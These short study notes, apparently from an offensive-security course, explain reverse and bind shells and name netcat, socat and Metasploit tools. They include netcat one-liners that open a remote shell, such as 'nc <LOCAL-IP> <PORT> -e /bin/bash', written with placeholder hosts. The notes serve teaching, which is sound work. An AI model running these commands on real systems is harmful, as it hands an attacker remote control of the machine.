# What is a shell?
In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

- Netcat
- socat
- Metasploit -- multi/handler
- Msfvenom

 At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.
 #### Reverse Shell
 - Reverse shells are when the target is forced to execute code that connects back to your computer.
- On the attacking machine:
```
sudo nc -lvnp 443
```
- On the target:
```
nc <LOCAL-IP> <PORT> -e /bin/bash
```
#### Blind shell
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.
- On the target:
```
nc -lvnp <port> -e "cmd.exe"
```
- On the attacking machine:
```
nc MACHINE_IP <port>
```
* Shells can be either interactive or non-interactive.

